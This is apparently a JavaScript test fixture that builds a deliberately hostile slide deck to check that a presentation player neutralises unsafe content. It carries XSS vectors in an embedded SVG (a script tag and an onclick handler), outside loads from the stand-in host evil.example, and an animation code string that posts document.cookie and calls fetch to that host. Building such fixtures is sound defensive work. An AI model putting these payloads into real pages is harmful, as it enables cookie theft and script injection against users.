// A crafted, hostile .horizon deck for the player's tests (Review Focus 6): a custom drawing carrying a script and an
// outside load, pictures and clips from outside addresses, a Horizon Calc animation with code, colours that try to load
// through CSS, and a narrative with voices. Benign data: nothing here is ever run.
export const PNG = 'data:image/png;base64,iVBORw0KGgo=';
export const MP3 = 'data:audio/mpeg;base64,SUQz';
export const WEBM = 'data:video/webm;base64,GkXf';
const EVIL = 'https://evil.example/x.png';
export const HOSTILE_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 320"><script>alert(1)</script><rect id="r" width="10" height="10" onclick="alert(2)"/>'
  + '<image href="https://evil.example/i.png"/><rect width="5" height="5" style="fill:url(https://evil.example/f)"/><text x="5" y="20">Safe text</text></svg>';

export const crafted = {
  format: 'horizon', version: 1, title: 'Crafted',
  theme: { canvas: 'night', canvasCustom: 'url(https://evil.example/bg.png)', slide: 'custom', slideCustom: '#1c2a36', hue: 150, sky: 'aurora', world: 'globe' },
  comments: { items: [{ id: 'c', text: 'private note' }] }, planning: [{ role: 'user', content: 'chat' }],
  frames: [
    { id: 'a', x: 0, y: 0, next: ['b', 'gone'], title: 'First', body: 'Line one\nLine two', viz: null, image: EVIL, layout: 'blank',
      objects: [
        { id: 'p1', kind: 'picture', x: 10, y: 10, w: 100, h: 80, image: EVIL, alt: 'Outside' },
        { id: 'p2', kind: 'picture', x: 120, y: 10, w: 100, h: 80, image: PNG, alt: 'Inside' },
        { id: 's1', kind: 'shape', shape: 'rect', x: 10, y: 200, w: 60, h: 40, fill: 'accent', line: '#ff0000', color: 'url(https://evil.example/c)' },
        { id: 'an', kind: 'animation', x: 300, y: 100, w: 320, h: 180,
          animation: { name: 'Bar race', code: 'parent.postMessage(document.cookie, "*"); fetch("https://evil.example")', payload: { periods: [] }, poster: PNG } },
        { id: 'av', kind: 'avatar', x: 600, y: 200, w: 160, h: 200,
          avatar: { look: { id: 'L', name: 'Host' }, voice: { id: 'V', name: 'Voice' }, lines: 'Hi', speaks: 'cue', still: PNG, clip: { media: 'clip1', seconds: 4, made: { lines: 'Hi', look: 'L', voice: 'V' } } } },
        { id: 'x1', kind: 'script', x: 0, y: 0, w: 1, h: 1 },
      ] },
    { id: 'b', x: 900, y: 0, next: [], title: 'Second', body: '', image: PNG,
      viz: { type: 'custom', items: [], concept: { name: 'n', caption: 'c', direction: 'd' },
        svg: HOSTILE_SVG } },
  ],
  narratives: { items: [
    { id: 'n1', name: 'Short tour', brief: 'b', language: 'en', chat: [{ role: 'user', content: 'x' }], pace: 140, passages: [
      { id: 'p1', part: 'a', text: 'Hello ⟨next⟩ and on.', sig: 's', checked: 'c', marks: [], audio: { key: 'voice1', sum: 'x', seconds: 3, marks: [{ kind: 'next', at: 1 }] } },
      { id: 'p2', part: 'b', text: 'The end ⟨cue⟩ now.', sig: 's', checked: 'c', marks: [], audio: { key: 'voice2', sum: 'y', seconds: 2.5, marks: [{ kind: 'cue', at: 1 }] } },
      { id: 'p3', part: 'gone', text: 'A slide that is not there.', sig: 's', checked: 'c', marks: [] },
    ] },
  ] },
  media: { clip1: WEBM, voice1: MP3, voice2: MP3, outside: 'https://evil.example/a.mp3', page: 'data:text/html;base64,PHNjcmlwdD4=' },
};
